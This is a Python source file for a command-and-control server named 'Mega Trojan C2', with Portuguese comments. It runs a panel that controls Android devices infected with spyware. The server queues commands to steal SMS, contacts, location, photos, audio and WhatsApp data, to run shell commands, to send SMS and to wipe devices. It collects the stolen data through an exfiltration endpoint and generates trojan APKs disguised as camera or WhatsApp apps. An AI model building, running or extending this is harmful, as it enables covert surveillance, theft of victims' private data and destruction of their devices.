#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Mega Trojan C2 — Servidor de controlo
Flask + WebSockets + SQLite
"""

import os
import sys
import sqlite3
import hashlib
import secrets
import json
import time
import threading
from datetime import datetime
from flask import Flask, request, jsonify, session, render_template_string, redirect, url_for
from flask_socketio import SocketIO, emit, join_room, leave_room
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.config['SECRET_KEY'] = secrets.token_hex(32)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# A base de dados fica na pasta 80 (raiz do projeto)
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DB_PATH = os.path.join(BASE_DIR, 'c2.db')

# ==================== BASE DE DADOS ====================

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS devices (
            device_id TEXT PRIMARY KEY,
            model TEXT,
            android_version TEXT,
            phone_number TEXT,
            ip_address TEXT,
            last_seen TEXT,
            status TEXT DEFAULT 'online',
            battery_level INTEGER DEFAULT 0,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            command TEXT,
            arguments TEXT,
            status TEXT DEFAULT 'pending',
            result TEXT,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS collected_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            data_type TEXT,
            content TEXT,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cursor.execute("SELECT COUNT(*) FROM users WHERE username = 'admin'")
    if cursor.fetchone()[0] == 0:
        password_hash = generate_password_hash('admin123')
        cursor.execute(
            "INSERT INTO users (username, password_hash) VALUES (?, ?)",
            ('admin', password_hash)
        )
    
    conn.commit()
    conn.close()

init_db()

# ==================== TEMPLATES ====================
LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login — Painel de Controlo</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff00;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .login-box {
            background: #111;
            border: 1px solid #333;
            padding: 40px;
            width: 350px;
            border-radius: 5px;
        }
        h1 { font-size: 24px; margin-bottom: 30px; text-align: center; letter-spacing: 3px; }
        input {
            width: 100%; padding: 12px; margin-bottom: 15px;
            background: #0a0a0a; border: 1px solid #333;
            color: #00ff00; font-family: inherit; font-size: 14px;
        }
        button {
            width: 100%; padding: 12px; background: #00ff00; color: #000;
            border: none; font-family: inherit; font-size: 16px;
            font-weight: bold; cursor: pointer; letter-spacing: 2px;
        }
        button:hover { background: #00cc00; }
        .error { color: #ff0000; text-align: center; margin-bottom: 15px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>// PAINEL C2 //</h1>
        {% if error %}<p class="error">{{ error }}</p>{% endif %}
        <form method="POST">
            <input type="text" name="username" placeholder="utilizador" required>
            <input type="password" name="password" placeholder="palavra-passe" required>
            <button type="submit">ENTRAR</button>
        </form>
    </div>
</body>
</html>
'''

PANEL_TEMPLATE = '''
<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Painel de Controlo</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a; color: #00ff00; display: flex; height: 100vh;
        }
        .sidebar {
            width: 250px; background: #111; border-right: 1px solid #333;
            padding: 20px; display: flex; flex-direction: column; gap: 10px;
        }
        .sidebar h2 { font-size: 18px; letter-spacing: 2px; margin-bottom: 20px; }
        .sidebar button {
            padding: 10px; background: transparent; border: 1px solid #00ff00;
            color: #00ff00; cursor: pointer; font-family: inherit;
            font-size: 13px; letter-spacing: 1px;
        }
        .sidebar button:hover { background: #00ff00; color: #000; }
        .main { flex: 1; padding: 20px; overflow-y: auto; }
        .header {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 20px; padding-bottom: 10px; border-bottom: 1px solid #333;
        }
        .device-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 15px;
        }
        .device-card { background: #111; border: 1px solid #333; padding: 20px; border-radius: 5px; }
        .device-card.online { border-color: #00ff00; }
        .device-card.offline { border-color: #ff0000; }
        .device-card h3 { margin-bottom: 10px; font-size: 16px; }
        .device-card p { font-size: 12px; margin-bottom: 5px; color: #888; }
        .device-actions { display: flex; flex-wrap: wrap; gap: 5px; margin-top: 15px; }
        .device-actions button {
            padding: 6px 10px; background: transparent; border: 1px solid #555;
            color: #00ff00; cursor: pointer; font-family: inherit; font-size: 11px;
        }
        .device-actions button:hover { border-color: #00ff00; }
        .section {
            display: none; background: #111; border: 1px solid #333;
            padding: 20px; margin-top: 20px; border-radius: 5px;
        }
        .section.active { display: block; }
        .section h3 { margin-bottom: 15px; letter-spacing: 2px; }
        input, textarea, select {
            width: 100%; padding: 10px; margin-bottom: 10px;
            background: #0a0a0a; border: 1px solid #333;
            color: #00ff00; font-family: inherit; font-size: 13px;
        }
        .log-output {
            background: #0a0a0a; border: 1px solid #333; padding: 15px;
            height: 400px; overflow-y: auto; font-size: 12px;
            white-space: pre-wrap; word-break: break-all;
        }
        .logout { color: #ff0000; text-decoration: none; font-size: 12px; }
    </style>
</head>
<body>
    <div class="sidebar">
        <h2>// C2 PANEL //</h2>
        <button onclick="showSection('devices')">Dispositivos</button>
        <button onclick="showSection('builder')">Gerar APK</button>
        <button onclick="showSection('logs')">Logs</button>
        <button onclick="loadDevices()">↻ Atualizar</button>
        <a href="/logout" class="logout" style="margin-top:auto;">Sair</a>
    </div>
    <div class="main">
        <div class="header">
            <h1>Dispositivos</h1>
            <span id="status">Ligado</span>
        </div>
        <div id="devices-section" class="section active">
            <div class="device-grid" id="device-grid"></div>
        </div>
        <div id="builder-section" class="section">
            <h3>Gerador de APK</h3>
            <input type="text" id="apk_name" placeholder="Nome da aplicação (ex: CamScanner)">
            <input type="text" id="c2_url" placeholder="URL do C2 (ex: http://teu-servidor)">
            <select id="icon_type">
                <option value="camera">Câmara</option>
                <option value="settings">Definições</option>
                <option value="gallery">Galeria</option>
                <option value="browser">Navegador</option>
                <option value="whatsapp">WhatsApp</option>
            </select>
            <button onclick="generateAPK()">GERAR APK</button>
            <div id="apk-result"></div>
        </div>
        <div id="logs-section" class="section">
            <h3>Dados Recolhidos</h3>
            <select id="log-device-select" onchange="loadLogs()"></select>
            <div class="log-output" id="log-output"></div>
        </div>
    </div>
    <script>
        function showSection(name) {
            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
            document.getElementById(name + '-section').classList.add('active');
            if (name === 'devices') loadDevices();
            if (name === 'logs') loadDeviceSelect();
        }
        async function loadDevices() {
            try {
                const response = await fetch('/api/devices');
                const devices = await response.json();
                const grid = document.getElementById('device-grid');
                grid.innerHTML = '';
                devices.forEach(device => {
                    const card = document.createElement('div');
                    card.className = 'device-card ' + device.status;
                    card.innerHTML = `
                        <h3>${device.model}</h3>
                        <p>ID: ${device.device_id.substring(0, 16)}...</p>
                        <p>Android: ${device.android_version}</p>
                        <p>Última atividade: ${device.last_seen}</p>
                        <p>Bateria: ${device.battery_level}%</p>
                        <div class="device-actions">
                            <button onclick="sendCommand('${device.device_id}', 'get_sms')">SMS</button>
                            <button onclick="sendCommand('${device.device_id}', 'get_contacts')">Contactos</button>
                            <button onclick="sendCommand('${device.device_id}', 'get_location')">GPS</button>
                            <button onclick="sendCommand('${device.device_id}', 'capture_photo')">Foto</button>
                            <button onclick="sendCommand('${device.device_id}', 'record_audio', '{"duration": 30}')">Áudio 30s</button>
                            <button onclick="sendCommand('${device.device_id}', 'run_shell', '{"cmd": "id"}')">Shell</button>
                            <button onclick="sendCommand('${device.device_id}', 'list_files', '{"path": "/sdcard/"}')">Ficheiros</button>
                            <button onclick="sendCommand('${device.device_id}', 'steal_whatsapp')">WhatsApp</button>
                            <button onclick="sendCommand('${device.device_id}', 'open_url', '{"url": "https://exemplo.com"}')">Abrir URL</button>
                            <button onclick="sendCommand('${device.device_id}', 'send_sms', '{"to": "911", "message": "teste"}')">Enviar SMS</button>
                            <button onclick="sendCommand('${device.device_id}', 'wipe_device')" style="color:#ff0000;">LIMPAR</button>
                        </div>
                    `;
                    grid.appendChild(card);
                });
            } catch (e) {
                console.error('Erro ao carregar dispositivos:', e);
            }
        }
        async function sendCommand(deviceId, command, args = '{}') {
            try {
                const response = await fetch(`/api/devices/${deviceId}/send_command`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({command: command, arguments: args})
                });
                const result = await response.json();
                console.log('Comando enviado:', result);
            } catch (e) {
                console.error('Erro ao enviar comando:', e);
            }
        }
        async function generateAPK() {
            const apkName = document.getElementById('apk_name').value;
            const c2Url = document.getElementById('c2_url').value;
            const iconType = document.getElementById('icon_type').value;
            
            if (!apkName || !c2Url) {
                document.getElementById('apk-result').innerHTML = '<p style="color:#ff0000;">Preenche nome e URL do C2</p>';
                return;
            }
            
            try {
                const response = await fetch('/api/generate_apk', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({apk_name: apkName, c2_url: c2Url, icon_type: iconType})
                });
                const result = await response.json();
                document.getElementById('apk-result').innerHTML =
                    result.status === 'success'
                        ? `<p style="color:#00ff00;">APK gerado: ${result.apk_path}</p>`
                        : `<p style="color:#ff0000;">Erro: ${result.message}</p>`;
            } catch (e) {
                document.getElementById('apk-result').innerHTML = `<p style="color:#ff0000;">Erro: ${e.message}</p>`;
            }
        }
        async function loadDeviceSelect() {
            try {
                const response = await fetch('/api/devices');
                const devices = await response.json();
                const select = document.getElementById('log-device-select');
                select.innerHTML = '';
                devices.forEach(device => {
                    const option = document.createElement('option');
                    option.value = device.device_id;
                    option.textContent = device.model + ' (' + device.device_id.substring(0, 8) + '...)';
                    select.appendChild(option);
                });
                if (devices.length > 0) loadLogs();
            } catch (e) {
                console.error('Erro ao carregar seleção:', e);
            }
        }
        async function loadLogs() {
            const deviceId = document.getElementById('log-device-select').value;
            try {
                const response = await fetch(`/api/devices/${deviceId}/data`);
                const data = await response.json();
                const output = document.getElementById('log-output');
                output.innerHTML = data.map(d =>
                    `<span style="color:#888;">[${d.created_at}]</span> ${d.data_type}: ${d.content}`
                ).join('\n');
            } catch (e) {
                console.error('Erro ao carregar logs:', e);
            }
        }
        setInterval(() => {
            if (document.getElementById('devices-section').classList.contains('active')) loadDevices();
        }, 10000);
    </script>
</body>
</html>
'''

# ==================== AUTENTICAÇÃO ====================
@app.route('/')
def index():
    if 'username' in session:
        return redirect(url_for('panel'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        conn = get_db()
        user = conn.execute("SELECT * FROM users WHERE username = ?", (username,)).fetchone()
        conn.close()
        if user and check_password_hash(user['password_hash'], password):
            session['username'] = username
            return redirect(url_for('panel'))
        return render_template_string(LOGIN_TEMPLATE, error='Credenciais inválidas')
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/logout')
def logout():
    session.pop('username', None)
    return redirect(url_for('login'))

@app.route('/panel')
def panel():
    if 'username' not in session:
        return redirect(url_for('login'))
    return render_template_string(PANEL_TEMPLATE)

# ==================== API ====================
def require_login(f):
    def wrapper(*args, **kwargs):
        if 'username' not in session:
            return jsonify({'error': 'Não autenticado'}), 401
        return f(*args, **kwargs)
    wrapper.__name__ = f.__name__
    return wrapper

@app.route('/api/devices')
@require_login
def api_devices():
    conn = get_db()
    devices = conn.execute("SELECT * FROM devices ORDER BY last_seen DESC").fetchall()
    conn.close()
    return jsonify([dict(d) for d in devices])

@app.route('/api/devices/<device_id>/data')
@require_login
def api_device_data(device_id):
    conn = get_db()
    data = conn.execute(
        "SELECT * FROM collected_data WHERE device_id = ? ORDER BY created_at DESC LIMIT 500",
        (device_id,)
    ).fetchall()
    conn.close()
    return jsonify([dict(d) for d in data])

@app.route('/api/devices/<device_id>/send_command', methods=['POST'])
@require_login
def api_send_command(device_id):
    command = request.json.get('command')
    arguments = request.json.get('arguments', '{}')
    conn = get_db()
    cursor = conn.execute(
        "INSERT INTO commands (device_id, command, arguments) VALUES (?, ?, ?)",
        (device_id, command, json.dumps(arguments))
    )
    command_id = cursor.lastrowid
    conn.commit()
    conn.close()
    socketio.emit('command', {
        'id': command_id,
        'command': command,
        'arguments': json.dumps(arguments)
    }, room=device_id)
    return jsonify({'status': 'sent', 'command_id': command_id})

# ==================== ROTA DE GERAÇÃO DE APK ====================
@app.route('/api/generate_apk', methods=['POST'])
@require_login
def api_generate_apk():
    try:
        apk_name = request.json.get('apk_name', 'app')
        c2_url = request.json.get('c2_url', '')
        icon_type = request.json.get('icon_type', 'camera')
        
        # Adiciona o diretório do gerador ao path
        gerador_dir = os.path.join(BASE_DIR, 'gerador')
        sys.path.insert(0, gerador_dir)
        
        from gerador_apk import generate_apk
        
        apk_path = generate_apk(apk_name, c2_url, icon_type)
        
        if apk_path:
            return jsonify({'status': 'success', 'apk_path': apk_path})
        return jsonify({'status': 'error', 'message': 'Falha ao gerar APK'}), 500
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ==================== ROTAS HTTP PARA O PAYLOAD ====================
@app.route('/api/device_connect', methods=['POST'])
def api_device_connect():
    """Dispositivo regista-se ou reconecta via HTTP"""
    try:
        data = request.get_json(force=True)
        device_id = data.get('device_id', '')
        
        if not device_id:
            device_id = secrets.token_hex(16)
        
        model = data.get('model', 'Unknown')
        android_version = data.get('android_version', 'Unknown')
        manufacturer = data.get('manufacturer', 'Unknown')
        phone_number = data.get('phone_number', 'Unknown')
        ip_address = request.remote_addr
        
        conn = get_db()
        
        # Verifica se existe
        existing = conn.execute(
            "SELECT * FROM devices WHERE device_id = ?",
            (device_id,)
        ).fetchone()
        
        if existing:
            conn.execute(
                "UPDATE devices SET model=?, android_version=?, phone_number=?, ip_address=?, last_seen=CURRENT_TIMESTAMP, status='online' WHERE device_id=?",
                (model, android_version, phone_number, ip_address, device_id)
            )
        else:
            conn.execute('''
                INSERT INTO devices (device_id, model, android_version, phone_number, ip_address, last_seen)
                VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            ''', (device_id, model, android_version, phone_number, ip_address))
        
        conn.commit()
        
        # Busca comandos pendentes
        pending = conn.execute(
            "SELECT * FROM commands WHERE device_id = ? AND status = 'pending'",
            (device_id,)
        ).fetchall()
        conn.close()
        
        commands_list = []
        for cmd in pending:
            commands_list.append({
                'id': cmd['id'],
                'command': cmd['command'],
                'arguments': cmd['arguments']
            })
        
        return jsonify({
            'status': 'success',
            'device_id': device_id,
            'commands': commands_list
        })
    
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/data_exfil', methods=['POST'])
def api_data_exfil():
    """Dispositivo envia dados recolhidos via HTTP"""
    try:
        data = request.get_json(force=True)
        device_id = data.get('device_id', '')
        data_type = data.get('data_type', '')
        content = data.get('content', {})
        
        conn = get_db()
        conn.execute(
            "INSERT INTO collected_data (device_id, data_type, content) VALUES (?, ?, ?)",
            (device_id, data_type, json.dumps(content))
        )
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success'})
    
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/command_result', methods=['POST'])
def api_command_result():
    """Dispositivo envia resultado de comando via HTTP"""
    try:
        data = request.get_json(force=True)
        command_id = data.get('command_id')
        result = data.get('result', {})
        
        conn = get_db()
        conn.execute(
            "UPDATE commands SET status='completed', result=? WHERE id=?",
            (json.dumps(result), command_id)
        )
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success'})
    
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ==================== WEBSOCKET (opcional) ====================
@socketio.on('register')
def handle_register(data):
    device_id = secrets.token_hex(16)
    conn = get_db()
    conn.execute('''
        INSERT INTO devices (device_id, model, android_version, phone_number, ip_address, last_seen)
        VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
    ''', (
        device_id,
        data.get('model', 'Unknown'),
        data.get('android_version', 'Unknown'),
        data.get('phone_number', 'Unknown'),
        request.remote_addr
    ))
    conn.commit()
    conn.close()
    join_room(device_id)
    emit('registered', {'device_id': device_id})

@socketio.on('device_hello')
def handle_device_hello(data):
    device_id = data.get('device_id')
    if device_id:
        join_room(device_id)
        conn = get_db()
        conn.execute("UPDATE devices SET last_seen = CURRENT_TIMESTAMP, status = 'online' WHERE device_id = ?", (device_id,))
        conn.commit()
        pending = conn.execute("SELECT * FROM commands WHERE device_id = ? AND status = 'pending'", (device_id,)).fetchall()
        for cmd in pending:
            emit('command', {'id': cmd['id'], 'command': cmd['command'], 'arguments': cmd['arguments']}, room=device_id)
        conn.close()

@socketio.on('command_result')
def handle_command_result(data):
    conn = get_db()
    conn.execute("UPDATE commands SET status = 'completed', result = ? WHERE id = ?", (json.dumps(data.get('result')), data.get('command_id')))
    conn.commit()
    conn.close()

@socketio.on('data_exfil')
def handle_data_exfil_socket(data):
    conn = get_db()
    conn.execute("INSERT INTO collected_data (device_id, data_type, content) VALUES (?, ?, ?)", (data.get('device_id'), data.get('data_type'), json.dumps(data.get('content'))))
    conn.commit()
    conn.close()

if __name__ == '__main__':
    print("[+] Mega Trojan C2 iniciado na porta 80")
    socketio.run(app, host='0.0.0.0', port=80, debug=False, allow_unsafe_werkzeug=True)
